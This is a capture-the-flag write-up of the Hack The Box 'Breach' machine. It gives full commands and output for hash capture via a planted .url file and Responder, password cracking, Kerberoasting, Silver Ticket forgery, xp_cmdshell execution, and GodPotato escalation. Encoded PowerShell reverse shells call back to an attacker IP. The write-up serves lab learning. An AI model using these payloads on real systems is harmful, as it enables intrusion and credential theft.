---
title: "Breach Walkthrough - HTB Medium | NTLM Relay via SMB & Silver Ticket Attack"
description: "Complete walkthrough of Breach from Hack The Box. A medium Windows machine featuring a Domain Controller with an exposed SMB share. A malicious .url file triggers NTLM authentication via Responder, capturing Julia Wong's hash. After cracking credentials, Kerberoasting reveals svc_mssql service account credentials. A Silver Ticket attack grants Administrator access to MSSQL, where xp_cmdshell is enabled for code execution. GodPotato privilege escalation from the C:\\Windows\\Tasks bypass directory achieves SYSTEM access."
author: dua2z3rr
date: 2026-02-25 5:00:00
categories:
  - HackTheBox
  - Machines
tags: ["enterprise-network", "active-directory", "protocols", "mssql", "password-cracking", "password-capture"]
image: /assets/img/breach/breach-resized.png
---
## Overview

`Breach` is a medium difficulty Windows machine, where guest access to an SMB share is available. By leveraging write permissions on that SMB share, `NTLMv2` hashes of a domain user are captured to obtain valid credentials. With access as a low-privileged domain user, a kerberoastable service account (`svc_mssql`) is revealed. After getting access to the service account, a Silver Ticket attack is performed to impersonate the `Administrator` user and gain access to Microsoft SQL Server. Through the `xp_cmdshell` feature, remote code execution is achieved as the `svc_mssql` service account. Finally, privilege escalation is performed by abusing the `SeImpersonatePrivilege` privilege.

---

## External Enumeration

### Nmap

Let's start with nmap:

```shell
[Feb 25, 2026 - 16:37:44 (CET)] exegol-main breach # ports=$(nmap -p- --min-rate=1000 -T4 10.129.7.239 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV 10.129.7.239  
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-25 16:41 CET  
<SNIP>
Nmap scan report for 10.129.7.239  
Host is up, received echo-reply ttl 127 (0.20s latency).  
Scanned at 2026-02-25 16:41:49 CET for 105s  
  
PORT      STATE SERVICE       REASON          VERSION  
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus  
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0  
|_http-title: IIS Windows Server  
| http-methods:  
|   Supported Methods: OPTIONS TRACE GET HEAD POST  
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-25 15:41:39Z)  
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds? syn-ack ttl 127  
464/tcp   open  kpasswd5?     syn-ack ttl 127  
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped    syn-ack ttl 127  
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM  
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped    syn-ack ttl 127  
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services  
| rdp-ntlm-info:  
|   Target_Name: BREACH  
|   NetBIOS_Domain_Name: BREACH  
|   NetBIOS_Computer_Name: BREACHDC  
|   DNS_Domain_Name: breach.vl  
|   DNS_Computer_Name: BREACHDC.breach.vl  
|   DNS_Tree_Name: breach.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-02-25T15:42:30+00:00  
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing  
<SNIP>
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
<SNIP>
```

**Key findings:**
- Domain Controller for **breach.vl**
- Port 80: **IIS 10.0**
- Port 88: **Kerberos**
- Port 389/636: **LDAP/LDAPS**
- Port 445: **SMB**
- Port 1433: **MSSQL Server 2019**
- Port 5985: **WinRM** (http?)
- Windows Server 2022 Build 20348

---

## Initial Access

### HTTP Enumeration

Let's start by visiting port 80:

![iis-default](assets/img/breach/iis-default-installation.png)

**Default IIS installation page.** Before proceeding with an exploit research for IIS 10.0, let's verify if this is the intended path by enumerating SMB and handling LDAP or Kerberos.

### SMB Enumeration

I try to enumerate SMB with the Guest account and it works:

```shell
[Feb 25, 2026 - 17:01:48 (CET)] exegol-main breach # nxc smb "10.129.7.239" -u 'Guest' -p '' -d 'BREACH' --shares  
SMB         10.129.7.239    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
SMB         10.129.7.239    445    BREACHDC         [+] BREACH\Guest:  
SMB         10.129.7.239    445    BREACHDC         [*] Enumerated shares  
SMB         10.129.7.239    445    BREACHDC         Share           Permissions     Remark  
SMB         10.129.7.239    445    BREACHDC         -----           -----------     ------  
SMB         10.129.7.239    445    BREACHDC         ADMIN$                          Remote Admin  
SMB         10.129.7.239    445    BREACHDC         C$                              Default share  
SMB         10.129.7.239    445    BREACHDC         IPC$            READ            Remote IPC  
SMB         10.129.7.239    445    BREACHDC         NETLOGON                        Logon server share  
SMB         10.129.7.239    445    BREACHDC         share           READ,WRITE  
SMB         10.129.7.239    445    BREACHDC         SYSVOL                          Logon server share  
SMB         10.129.7.239    445    BREACHDC         Users           READ
```

**Important discovery:**
- Users share is **READ**
- **share** share is both **READ,WRITE**

### Share Exploration

Accessing with smbclientng (still with Guest credentials) the "share" share, we can find 3 usernames:

```shell
■[\\10.129.7.239\Users\Default\AppData\]> use share  
■[\\10.129.7.239\share\]> dir  
d-------     0.00 B  2026-02-25 17:01  .\  
d--h--s-     0.00 B  2025-09-09 12:35  ..\  
d-------     0.00 B  2022-02-17 12:19  finance\  
d-------     0.00 B  2022-02-17 12:19  software\  
d-------     0.00 B  2025-09-08 12:13  transfer\  
■[\\10.129.7.239\share\]> cd transfer  
■[\\10.129.7.239\share\transfer\]> dir  
d-------     0.00 B  2025-09-08 12:13  .\  
d-------     0.00 B  2026-02-25 17:01  ..\  
d-------     0.00 B  2022-02-17 12:21  claire.pope\  
d-------     0.00 B  2022-02-17 12:21  diana.pope\  
d-------     0.00 B  2025-04-17 02:38  julia.wong\  
■[\\10.129.7.239\share\transfer\]> cd claire.pope/  
■[\\10.129.7.239\share\transfer\claire.pope\]> dir  
[error] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

**Usernames found:**
- claire.pope
- diana.pope
- julia.wong

We cannot read inside these directories.

### Username Confirmation

I want to confirm the usernames we found:

```shell
[Feb 25, 2026 - 17:14:23 (CET)] exegol-main breach # username-anarchy claire pope >> username.list  
[Feb 25, 2026 - 17:14:41 (CET)] exegol-main breach # username-anarchy diana pope >> username.list  
[Feb 25, 2026 - 17:15:01 (CET)] exegol-main breach # username-anarchy julia wong >> username.list
[Feb 25, 2026 - 17:16:35 (CET)] exegol-main breach # kerbrute userenum --domain "BREACH" --dc '10.129.7.239' username.list -v  
  
__             __               __  
/ /_____  _____/ /_  _______  __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/  
  
Version: dev (n/a) - 02/25/26 - Ronnie Flathers @ropnop  
  
<SNIP>
2026/02/25 17:17:10 >  [+] VALID USERNAME:       claire.pope@BREACH  
<SNIP>
2026/02/25 17:17:10 >  [+] VALID USERNAME:       diana.pope@BREACH  
<SNIP>
2026/02/25 17:17:10 >  [+] VALID USERNAME:       julia.wong@BREACH  
<SNIP>
2026/02/25 17:17:10 >  Done! Tested 45 usernames (3 valid) in 0.680 seconds
```

**Valid accounts confirmed:**
- claire.pope
- diana.pope
- julia.wong

### NTLM Hash Capture via Responder

I enumerated the Users share for a long time without any results. After much time, I discovered that a file needed to be created pointing to us on the share.

I uploaded this file to the share:

```shell
[Feb 25, 2026 - 18:32:05 (CET)] exegol-main breach # cat Internet\ Shortcut\ File.url  
[InternetShortcut]  
URL=asdasdas  
WorkingDirectory=hehe  
IconFile=\\10.10.15.220\aasd\nc.ico  
IconIndex=1
```

Then I activated Responder and obtained wong's hash:

```shell
[Feb 25, 2026 - 18:31:31 (CET)] exegol-main breach # responder -I tun0  
__  
.----.-----.-----.-----.-----.-----.--|  |.-----.----.  
|   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  
|__| |_____|_____|   __|_____|__|__|_____||_____|__|  
|__|  
  
<SNIP>
  
[+] Listening for events...  
  
[!] Error starting TCP server on port 3389, check permissions or other servers running.  
[SMB] NTLMv2-SSP Client   : 10.129.7.239  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:1122334455667788:D464DBF510612AE907508C8CDA9D3E73:010100000000000080CABBF984A6DC0129EAE63A3F04056200000000020008004900360<SNIP>
[*] Skipping previously captured hash for BREACH\Julia.Wong
```

**NTLMv2 hash captured:** `Julia.Wong::BREACH:1122334455667788:D464DBF510612AE907508C8CDA9D3E73:<SNIP>`

### Hash Cracking

Let's crack Julia Wong's hash and obtain the password `Computer1`:

```shell
hashcat -m 5600 hash /opt/lists/rockyou.txt
<SNIP>
[hashcat output showing password: Computer1]
```

**Credentials obtained:** `julia.wong:Computer1`

We obtain the user flag which is in the transfer/julia.wong folder on the "share" share.

**User flag obtained.**

---

## Lateral Movement

### BloodHound Enumeration

Let's enumerate the domain with BloodHound. We obtain 2 important pieces of information with queries made to the database:

1. **Shortest path to domain admins:**
![shortest path to domain admins](assets/img/breach/shortest-path-to-da.png)

2. **Kerberoastable users (1 user):**
![kerberoastable](assets/img/breach/kerberoastable.png)

### Kerberoasting

We saw that the `svc_mssql` user is kerberoastable. Let's obtain their password:

```shell
[Feb 25, 2026 - 19:00:19 (CET)] exegol-main breach # GetUserSPNs.py -dc-ip 10.129.7.239 BREACH.VL/julia.wong -request-user svc_mssql -outputfile svc_mssql_tgs  
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies  
  
Password:  
ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------  
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 11:43:08.106169  2026-02-25 16:32:07.949176  
  
<SNIP>

[Feb 25, 2026 - 19:02:37 (CET)] exegol-main breach # hashcat -m 13100 svc_mssql_tgs /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting  
  
<SNIP>

$krb5tgs$23$*svc_mssql$BREACH.VL$BREACH.VL/svc_mssql*$e61f5c91bf479f162c7f02bbc9ebe851$<SNIP>:Trustno1  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
<SNIP>
Started: Wed Feb 25 19:03:03 2026  
Stopped: Wed Feb 25 19:04:18 2026
```

**Credentials obtained:** `svc_mssql:Trustno1`

---

## Privilege Escalation

### Silver Ticket Attack

Since we have the credentials of the svc_mssql user, and this account is a service account, we can create a Silver Ticket to impersonate any user, including Administrator:

```shell
[Feb 25, 2026 - 22:29:14 (CET)] exegol-main breach # pypykatz crypto nt "Trustno1"  
69596c7aa1e8daee17f8e78870e25a5c
[Feb 25, 2026 - 22:31:32 (CET)] exegol-main breach # ticketer.py -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.7.239 -domain breach.vl -user-id 500 Administrator
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Creating basic skeleton ticket and PAC Infos  
[*] Customizing ticket for breach.vl/Administrator  
[*]     PAC_LOGON_INFO  
[*]     PAC_CLIENT_INFO_TYPE  
[*]     EncTicketPart  
[*]     EncTGSRepPart  
[*] Signing/Encrypting final ticket  
[*]     PAC_SERVER_CHECKSUM  
[*]     PAC_PRIVSVR_CHECKSUM  
[*]     EncTicketPart  
[*]     EncTGSRepPart  
[*] Saving ticket in Administrator.ccache
```

> The domain SID can be retrieved from BloodHound on the BREACH.VL node
{: .prompt-info }

```shell
[Feb 25, 2026 - 22:32:31 (CET)] exegol-main breach # mssqlclient.py -k -no-pass -windows-auth breachdc.breach.vl  
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)  
[!] Press help for extra shell commands  
SQL (BREACH\Administrator  dbo@master)>
```

**MSSQL access obtained as Administrator.**

### xp_cmdshell Enablement

Let's enable the shell on MSSQL:

```text
SQL (BREACH\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1  
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE  
SQL (BREACH\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1  
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE  
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "whoami"  
output  
----------------  
breach\svc_mssql  
  
NULL
```

**Code execution achieved** as svc_mssql.

### Reverse Shell

Let's obtain a simple reverse shell.

Setup listener:

```shell
[Feb 25, 2026 - 22:45:44 (CET)] exegol-main breach # nc -lnvp 9001  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::9001  
Ncat: Listening on 0.0.0.0:9001
```

Send the payload via MSSQL:

```shell
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAyADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

We have our shell:

```powershell
PS C:\Windows\system32>
```

### GodPotato Privilege Escalation

We see that we have SeImpersonatePrivilege, and when we have it, Potato should always be our first solution.

I had many difficulties getting the exploit to run, but then I found the solution by executing the exploit from the `C:\Windows\Tasks` folder (one of the most famous bypass directories).

First, we need to understand what version of GodPotato we need to run based on the .NET version. We can discover this by looking at the directories present in the `C:\Windows\Microsoft.NET\Framework\` directory.

In our case, folders 4.0 and 2.0 were present, so I decided to use the exploit for the newer version.

First, I open the listener:

```shell
[Feb 25, 2026 - 23:48:34 (CET)] exegol-main windows # nc -lnvp 9002  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::9002  
Ncat: Listening on 0.0.0.0:9002
```

Then we download the file to the bypass folder (I will move it there because I had already downloaded it to another folder). Then we execute the exploit:

```powershell
PS C:\Windows\system32> cd C:\Users\Public\Downloads  
PS C:\Users\Public\Downloads> copy .\GodPotato-NET4.exe C:\windows\tasks\  
PS C:\Users\Public\Downloads> cd C:\windows\tasks  
PS C:\windows\tasks> dir  
  
  
Directory: C:\windows\tasks  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----         2/25/2026  10:33 PM          57344 GodPotato-NET4.exe  
  
  
PS C:\windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAyADAAIgAsADkAMAAwADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

---

## Root Access

Wait a few minutes and we should have obtained a shell as **SYSTEM**:

```powershell
[Feb 25, 2026 - 23:48:34 (CET)] exegol-main windows # nc -lnvp 9002  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::9002  
Ncat: Listening on 0.0.0.0:9002  
  
Ncat: Connection from 10.129.7.239.  
Ncat: Connection from 10.129.7.239:59327.  
PS C:\windows\tasks> whoami  
nt authority\system
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The .url file technique with Responder was completely unexpected - I would never have imagined needing to upload a malicious Internet Shortcut file to the writable SMB share to trigger NTLM authentication and capture hashes. The Silver Ticket attack was also surprising - while I knew the technique by name, I had to research how to properly exploit it, including using pypykatz to convert the plaintext password to NTLM hash, then using ticketer.py with the correct SPN and domain SID. Finally, GodPotato's requirement to run from the C:\Windows\Tasks bypass directory was unexpected - the exploit failed from other locations, and I had to determine the correct .NET Framework version (4.0 vs 2.0) by checking C:\Windows\Microsoft.NET\Framework\ directories.

### Main Mistake

I enumerated the Users share for a very long time without any results before discovering the .url file upload technique. I should have researched SMB coercion techniques and NTLM relay attacks earlier instead of spending so much time on manual share enumeration. 

### Open Question

While researching how to exploit the Silver Ticket for the mssql service account, I discovered that this attack is stealthy but limited. What is so stealthy about it and how can defenders mitigate and discover this attack on their network?

---

**Completed this box? Did the .url file + Responder trick surprise you?** Leave a comment down below!
